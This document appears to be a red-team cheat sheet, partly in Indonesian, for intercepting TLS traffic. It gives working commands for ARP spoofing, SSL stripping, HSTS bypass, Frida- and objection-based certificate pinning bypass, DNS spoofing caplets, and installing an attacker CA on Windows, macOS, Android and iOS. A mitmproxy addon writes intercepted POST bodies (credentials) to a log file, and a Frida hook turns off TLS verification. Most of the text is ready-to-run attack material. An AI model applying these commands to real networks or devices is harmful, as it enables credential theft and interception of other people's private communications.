# mitm-tls — net

# TLS MITM: ARP Spoof + Forwarding, SSL Stripping, HSTS Bypass, Certificate Pinning Bypass, Transparent Proxy

## 1. Topology & Prerequisites

| Component | Specification | Notes |
|---|---|---|
| Attacker host | Kali 2024.4, kernel 6.11 | `ip_forward`, `iptables`, `bettercap 2.32.0`, `mitmproxy 11.0` |
| Target (client) | Windows 11 24H2 / Android 14 / iOS 17.5 | Chrome 131, Edge 131, Safari 17.5 |
| Gateway | Router uplink | MAC diketahui via ARP |
| Interface | `eth0` (wired) / `wlan0` (monitor+AP) | Wired is more stable for ARP |

```bash
# Baseline: forwarding + disable ICMP redirect protection
sysctl -w net.ipv4.ip_forward=1
sysctl -w net.ipv4.conf.all.send_redirects=0
sysctl -w net.ipv4.conf.all.rp_filter=0
sysctl -w net.ipv6.conf.all.forwarding=1   # bila target dual-stack
```

---

## 2. ARP Spoof + Forwarding

### 2.1 What is sent
Gratuitous ARP reply to target: "gateway IP = attacker MAC". Conversely to gateway: "target IP = attacker MAC". After the cache is poisoned, all client↔gateway traffic passes through the attacker.

### 2.2 bettercap 2.32.0

```bash
sudo bettercap -iface eth0
# dalam sesi:
> set arp.spoof.targets 192.168.10.50
> set arp.spoof.fullduplex true
> set arp.spoof.internal false
> arp.spoof on
> net.sniff on
> events.stream on
```

### 2.3 arpspoof (dsniff) manual

```bash
# Terminal 1
sudo arpspoof -i eth0 -t 192.168.10.50 192.168.10.1
# Terminal 2
sudo arpspoof -i eth0 -t 192.168.10.1 192.168.10.50
# Terminal 3 (opsional, lihat trafik)
sudo tcpdump -i eth0 -n -A 'tcp port 80 or tcp port 443'
```

### 2.4 Compare results

| Condition | What appears on attacker | Why it succeeds/fails |
|---|---|---|
| ARP spoof OK, forwarding OFF | Client completely disconnected (blackhole) | Packets reach attacker, not forwarded |
| Forwarding ON + iptables drop default | Traffic passes, high TCP retransmit | Reverse path filter (rp_filter=1) drops asymmetric packets |
| Forwarding ON + rp_filter=0 | TCP stable, throughput ~line rate | Kernel forwards according to routing table |
| Target = Windows 11 24H2 with **static ARP cache** (enterprise policy) | Spoof doesn't work | Static neighbor entry is not overwritten |

### 2.5 Forwarding via nftables (modern)

```bash
nft add table ip redir
nft 'add chain ip redir pre { type nat hook prerouting priority dstnat; }'
nft add rule ip redir pre tcp dport 80 redirect to :8080
nft add rule ip redir pre tcp dport 443 redirect to :8443
```

---

## 3. SSL Stripping

### 3.1 Mekanisme
Attacker intercepts the first HTTP request (before HSTS is installed), replaces `Location: https://...` with `http://...`, and rewrites internal links. The attacker then proxies to upstream via HTTPS. Suitable when the victim types `example.com` (not `https://example.com`) and the site sends a 301 to HTTPS.

### 3.2 sslstrip (original, Moxie)

```bash
# iptables: alihkan port 80 ke sslstrip, port 443 tetap diarahkan ke backend
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8443
sudo sslstrip -l 10000 -w sslstrip.log -k -f
```

**Limitation**: sslstrip does not handle real TLS. `-k` disables HSTS header rewrite. Does not work on HSTS-preloaded.

### 3.3 sslstrip2 + dns2proxy (more relevant 2024)
Combination to force downgrade via DNS (NXDOMAIN on names with `https` + rewriting). Works when the attacker controls DNS.

```bash
sudo python3 dns2proxy.py -u 8.8.8.8 -i eth0
sudo python3 sslstrip2.py -l 10000 -w log.txt -f
```

### 3.4 What appears vs why it fails

| Scenario | Result | Technical reason |
|---|---|---|
| Target types `http://bank.example` | Strip succeeds, HTTP plaintext credentials visible | No HSTS yet, no preload |
| Target types `https://bank.example` | Fails; browser refuses, cert warning shown | Direct TLS handshake, strip cannot pivot |
| Domain in HSTS preload list | Total failure | Browser forces HTTPS from initial request |
| Domain sends header `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` | Fails from 2nd request of previous session | HSTS cached |

---

## 4. HSTS Bypass

HSTS is not GIVING UP. Remaining vectors:

### 4.1 HSTS cache poisoning via HTTP (pre-connection)
If the client has never been to the HTTPS domain and the attacker sends an HTTP response with HSTS header with `max-age=0` → removes entry (if browser allows update from HTTP — **Chrome 131 ignores** HSTS header on non-secure response since Chrome 68). This vector is dead.

### 4.2 Client that has never visited the domain + user click-through
If the domain is not preloaded, the **first request** can be attacked. After that HSTS locks it.

### 4.3 Time-based attack (HSTS max-age expiry)
Chrome default: uses `max-age`. If server sends `max-age=300`, after 5 minutes without a visit, HSTS is gone. Can be checked:

```
chrome://net-internals/#hsts
```

### 4.4 Subdomain without HSTS
`includeSubDomains` is often forgotten to be set. Redirect to subdomain (`http://sub.target.example`) then strip.

### 4.5 Non-browser client & native applications
Android apps using old WebView / `OkHttp` without `NetworkSecurityConfig` do not respect HSTS. This is the main path today.

### 4.6 DNS-based redirect that forces HTTP
Combine ARP spoof + DNS spoof so that `target.example` resolves to attacker, attacker sends HTTP 200 directly without redirect. **Does not work** for preloaded domains because the browser performs scheme upgrade before connection.

### 4.7 Summary table

| Technique | Applies when | Fails when |
|---|---|---|
| First-request strip | Domain never accessed, not preloaded | Preloaded / previously accessed |
| Subdomain escape | `includeSubDomains` absen | HSTS `includeSubDomains` + preload |
| HSTS header downgrade | — (does not apply Chrome ≥68) | Always fails in modern browsers |
| Non-browser client | Mobile app without pinning | App with pinning |
| DNS + HTTP hijack | Domain non-preloaded | Preload list immutable |

Chrome 131 preload list is sourced from `chromium.googlesource.com/chromium/src/+/main/net/http/transport_security_state_static.json`.

---

## 5. Certificate Pinning Bypass

### 5.1 Desktop

**Chrome 131** uses Chrome Root Store + Certificate Transparency. Built-in pinning exists only on a few Google domains. For general targets, just add the attacker CA to the OS trust store or use `--ignore-certificate-errors-spki-list`.

```bash
# Launch Chromium dengan profil khusus
chromium --user-data-dir=/tmp/mitm \
  --proxy-server="http=127.0.0.1:8080;https=127.0.0.1:8080" \
  --ignore-certificate-errors
```

**Firefox 133** memakai NSS store sendiri; import CA:

```
about:config → security.enterprise_roots.enabled = true
```

Or via policy:

```json
// policies.json
{
  "policies": {
    "Certificates": {
      "ImportEnterpriseRoots": true,
      "Install": ["/etc/mitmproxy/mitmproxy-ca-cert.pem"]
    }
  }
}
```

### 5.2 Android

**Android 14 (API 34)** treats user CA as **untrusted** for apps targeting SDK ≥ 24 by default.

| Method | Root | Non-root | Notes |
|---|---|---|---|
| User CA + target SDK <24 | Ya | Ya | Hampir punah |
| Magisk module `movecert` (system CA) | Yes | — | Android 14 needs Zygisk |
| `apk-mitm` (patch APK) | — | Yes | Modifies `network_security_config` in APK |
| Frida hook `SSLContext` | Yes | Yes (with Frida server) | Effective against Java pinning, not native |
| objection `android sslpinning disable` | Yes | Yes | Frida wrapper for OkHttp, TrustManagerImpl |

```bash
# apk-mitm
apk-mitm target.apk
# hasil: target-patched.apk, network_security_config dengan user CA trusted

# Frida + objection
frida-server -l 0.0.0.0 &
objection -g com.target.app explore
# di prompt:
# android sslpinning disable
```

**Bypass Network Security Config secure:**

```xml
<!-- res/xml/network_security_config.xml hasil patch -->
<network-security-config>
  <base-config cleartextTrafficPermitted="true">
    <trust-anchors>
      <certificates src="system"/>
      <certificates src="user"/>
    </trust-anchors>
  </base-config>
</network-security-config>
```

### 5.3 iOS 17.5

| Method | Jailbreak | Non-JB |
|---|---|---|
| Install root CA + enable in Settings → General → About → Certificate Trust | Yes | Yes |
| `SSL Kill Switch 3` (Tweak) | Ya | — |
| Frida + `frida-ios-dump` + hook `SecTrustEvaluate` | Ya | — |
| Objection `ios sslpinning disable` | Ya | — |
| Patch binary via `frida` on non-JB device (requires Frida Gadget injected into IPA) | — | Yes (re-sign IPA) |

```bash
# objection pada iOS
objection -g com.target.app explore
ios sslpinning disable
```

### 5.4 Pinning bypass via native code (Flutter / React Native / BoringSSL)

Frida Java hook fails if pinning is implemented in native (`libssl.so`, `libflutter.so`, BoringSSL).

```javascript
// frida script: hook SSL_CTX_set_verify
Interceptor.attach(Module.findExportByName(null, "SSL_CTX_set_verify"), {
  onEnter(args) { args[1] = ptr(0); }  // SSL_VERIFY_NONE
});
```

For Flutter, hook `ssl_crypto_x509_session_verify_cert_chain` (symbol in `libflutter.so`). For OkHttp in RN, hook Java `CertificatePinner.check`.

### 5.5 Why it fails

| Gejala | Penyebab |
|---|---|
| `Trust anchor for certification path not found` | CA not yet trusted in the store used by the app |
| `Certificate pinning failure` (OkHttp) | App uses `CertificatePinner` — needs Frida |
| App crashes on launch after Frida attach | Anti-Frida (`ptrace` check) — use custom `frida-server` version / rename |
| TLS 1.3 + ECH → SNI not visible | Not a pinning failure; an observability failure |
| mTLS client cert | Attacker needs the real client cert — extract it from the app via Frida hook `KeyManager` |

---

## 6. Transparent Proxy: mitmproxy 11.0

### 6.1 Mode transparent (Linux)

```bash
# Non-TLS + TLS
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-ports 8080
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-ports 8080
# Exclude trafik attacker sendiri
sudo iptables -t nat -A OUTPUT -m owner --uid-owner kali -j RETURN

mitmproxy --mode transparent --listen-port 8080 \
  --set confdir=/tmp/mitm \
  --set stream_large_bodies=10m \
  --save-stream-file /tmp/mitm.flows
```

### 6.2 Upstream mode (when there is a corporate proxy)

```bash
mitmproxy --mode upstream:http://corp-proxy:3128 --upstream-auth user:pass
```

### 6.3 WireGuard mode (2024 recommendation, without ARP spoof)

```bash
mitmproxy --mode wireguard --listen-port 51820
# Device klien scan QR / import config, semua trafik otomatis ke mitmproxy
```

Pros: no need for ARP spoof, works for mobile targets via WireGuard config. Cons: requires access to install a profile on the device.

### 6.4 Script addon: log kredensial + autoinject

```python
# addons/creds.py — mitmproxy 11 addon API
from mitmproxy import http

def request(flow: http.HTTPFlow):
    if flow.request.method == "POST":
        flow.request.headers["X-Intercepted-By"] = "redteam"
        with open("/tmp/creds.log", "a") as f:
            f.write(f"{flow.request.pretty_url}\n{flow.request.get_text()}\n---\n")

def response(flow: http.HTTPFlow):
    # strip HSTS agar sesi berikut bisa di-downgrade (tidak selalu berhasil)
    if "strict-transport-security" in flow.response.headers:
        del flow.response.headers["strict-transport-security"]
```

```bash
mitmdump -s addons/creds.py --mode transparent --listen-port 8080
```

### 6.5 Transparent mode with pfSense/OPNsense (upstream redirect)
Redirect ports 80/443 in the firewall to the mitmproxy host. Useful for red teams that control the network segment.

---

## 7. Transparent Proxy: bettercap 2.32.0

### 7.1 HTTP/HTTPS proxy built-in

```bash
sudo bettercap -iface eth0 -eval "
  set arp.spoof.targets 192.168.10.50;
  set http.proxy.sslstrip true;
  set http.proxy.port 8080;
  arp.spoof on;
  http.proxy on;
  net.sniff on
"
```

### 7.2 Combination with mitmproxy (bettercap as spoofer, mitmproxy as parser)

```bash
# bettercap: spoof + redirect ke mitmproxy
sudo bettercap -iface eth0 -eval "
  set arp.spoof.targets 192.168.10.50;
  set arp.spoof.fullduplex true;
  set https.proxy.port 8080;
  arp.spoof on;
  https.proxy on
"

# mitmproxy di belakang bettercap (mode upstream)
mitmproxy --mode upstream:https://127.0.0.1:8083 --listen-port 8081
```

### 7.3 bettercap modules relevan

| Module | Function | Command |
|---|---|---|
| `arp.spoof` | ARP MITM | `arp.spoof on` |
| `http.proxy` | HTTP/HTTPS intercept | `http.proxy on` |
| `https.proxy` | Transparent HTTPS | `https.proxy on` |
| `net.sniff` | Packet capture | `net.sniff on` |
| `dns.spoof` | DNS hijack | `dns.spoof on` |
| `caplets` | Script otomatis | `caplets.show` |

### 7.4 Caplet otomatis

```
# /usr/local/share/bettercap/caplets/redteam.cap
set arp.spoof.targets 192.168.10.50
set arp.spoof.fullduplex true
set http.proxy.sslstrip true
set http.proxy.port 8080
set https.proxy.port 8083
set dns.spoof.domains target.example,*.target.example
set dns.spoof.address 192.168.10.99
arp.spoof on
http.proxy on
https.proxy on
dns.spoof on
net.sniff on
```

---

## 8. Certificate Authority Attacker

```bash
# mitmproxy 11.0
mitmproxy --set confdir=/tmp/mitm  # auto-generate CA
ls /tmp/mitm/mitmproxy-ca-cert.pem  # distribusikan ke target
# Server-side CA (client cert)
ls /tmp/mitm/mitmproxy-ca.pem
```

Install to target:

| OS | Command |
|---|---|
| Windows 11 24H2 | `certutil -addstore -f Root mitmproxy-ca-cert.pem` (admin) |
| macOS 15 | `security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain cert.pem` |
| Debian/Ubuntu | `cp cert.crt /usr/local/share/ca-certificates/ && update-ca-certificates` |
| Android 14 (system, Magisk) | `mount -o rw,remount /system; cp cert.0 /system/etc/security/cacerts/` |
| iOS 17.5 | AirDrop profile → Settings → General → VPN & Device Management → Install → Certificate Trust Settings |

---

## 9. Interaksi Versi & Angka Konkret

| Teknologi | Versi / Perilaku | Implikasi red team |
|---|---|---|
| Chrome 131 | Ignores `Strict-Transport-Security` on HTTP responses | HSTS downgrade header disabled |
| Chrome 131 | Preload list baked-in, diupdate ~6 minggu | Domain preload = kebal strip |
| Chrome 131 | HSTS `max-age=0` from HTTPS removes the entry | Can "reset" HSTS if the attacker controls the server |
| Firefox 133 | `security.enterprise_roots.enabled` defaults to false | Must be set via policy |
| Windows 11 24H2 | Certificate pinning only for Microsoft services | Bypass = trust store |
| Android 14 | User CA not trusted for SDK ≥ 24 | Requires apk-mitm / Frida |
| iOS 17.5 | ATS does not honor user CA without Trust Settings toggle | Toggle required manually |
| mitmproxy 11.0 | Addon API `request`/`response`, `http.HTTPFlow` | Migration from 10 minor |
| bettercap 2.32.0 | `https.proxy` modul native (BoringSSL) | `http.proxy.sslstrip` kombinasi |
| OpenSSL 3.3 | Default TLS 1.3, no renegotiation | Pinning bypass must be at the app layer |
| nginx 1.25 | `ssl_reject_handshake on` for default SNI | Prevents SNI-based MITM |

---

## 10. Operational Pitfalls (that make techniques fail in the field)

1. **rp_filter enabled in the attacker kernel** → reply packets from the target are dropped; `tcpdump` shows requests but responses disappear. Set `net.ipv4.conf.all.rp_filter=0` **before** spoofing.
2. **IPv6 enabled on the target** → IPv4 ARP spoof captures nothing because Chrome chooses Happy Eyeballs (IPv6 first). Solution: `arp.spoof` IPv6 (NDP spoof) or disable RA on the segment.
3. **Target uses DoH/DoT** (Chrome 131 defaults to DoH if the resolver supports it) → DNS spoof fails; block UDP 53/853 + DoH endpoints via iptables, or intercept DoH via TLS MITM (requires pinning bypass).
4. **Windows 11 24H2 with "Network Protection"** (Defender for Endpoint) → detects ARP spoof and disconnects. Check `Get-MpPreference` in the lab.
5. **Chrome 131 with QUIC/HTTP3** → UDP 443 traffic does not go through the TCP transparent proxy. Block UDP 443 or `--disable-quic` (via policy) — practical: `iptables -A FORWARD -p udp --dport 443 -j REJECT`.
6. **HTTP/2 & HTTP/3 multiplexing** → do not perform byte-level rewrite on the stream; use a mitmproxy addon at the flow level.
7. **Certificate Transparency (SCT)** → the attacker CA does not have a valid SCT; Chrome 131 only enforces it in some contexts, but sites with `Expect-CT` + SCT enforcement may reject. Bypass: `--ignore-certificate-errors-spki-list` or strip the `Expect-CT` header in the addon.
8. **mTLS**: mobile apps with client certs (banking) — without the real client cert, the TLS handshake to upstream fails. Extract the client cert via Frida hook `KeyChain`/`KeyStore`.
9. **Certificate pinning in Flutter/BoringSSL** → Java hooks are useless; look for symbols in `libflutter.so` (build hash differs per Flutter version — `3.24.x`, `3.27.x`).
10. **iOS 17.5 developer mode + ATS** → apps with `NSAllowsArbitraryLoads=false` + custom trust evaluation reject user CA even if installed; requires Frida/JB.
11. **ARP spoof vs switch port security** (DHCP snooping + dynamic ARP inspection) → spoof is dropped; requires L2 pivot or managed device.
12. **bettercap `arp.spoof.internal=false`** misconfigured → does not spoof traffic between hosts in the segment; the default often makes MITM not work.
13. **`iptables` REDIRECT vs TPROXY** for traffic that comes in **and** goes out: REDIRECT in PREROUTING does not capture the attacker's own loopback; add an OUTPUT rule with `--uid-owner` exclusion.
14. **mitmproxy CA not imported into app-specific trust** (e.g. Java keystore, Android keystore in the app bundle) → TLS fails; check `java.security` in the bundled JDK.
15. **QUIC fallback**: after blocking UDP 443, the browser falls back to TCP 443 but may retry for a few seconds — timing matters during a demo.
16. **HSTS `preload` + `includeSubDomains`** = all subdomains are locked too; there is no subdomain escape.
17. **Browser DNS cache** (Chrome host resolver cache) → after DNS spoofing, clear `chrome://net-internals/#dns` or wait for TTL.
18. **mitmproxy certificate expired** after a few months in `confdir` → regenerate: `rm -rf ~/.mitmproxy/ && mitmproxy` once.
19. **PKP (Public Key Pinning) header** deprecated in Chrome but still honored by older browsers (Edge 130, Firefox 130) → check the `Public-Key-Pins` header on the target.
20. **Wireshark shows massive "TCP Retransmission"** = forwarding is not actually working, usually `iptables FORWARD` policy DROP; set `iptables -P FORWARD ACCEPT` or an explicit rule.

---

## 11. Core Command Cheat Sheet

```bash
# Full ARP MITM + transparent proxy (bettercap + mitmproxy)
sysctl -w net.ipv4.ip_forward=1
sysctl -w net.ipv4.conf.all.rp_filter=0
sudo bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.10.50; set arp.spoof.fullduplex true; arp.spoof on"
sudo iptables -t nat -A PREROUTING -p tcp --dport 80  -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080
mitmproxy --mode transparent --listen-port 8080 --set confdir=/tmp/mitm

# Android pinning bypass
apk-mitm app.apk
adb install -r app-patched.apk
adb shell settings put global http_proxy 192.168.10.99:8080

# iOS pinning bypass (JB)
objection -g com.target.app explore
# > ios sslpinning disable

# HSTS state inspection (Chrome)
# chrome://net-internals/#hsts → Query domain
```

---

## [reasoning trace]


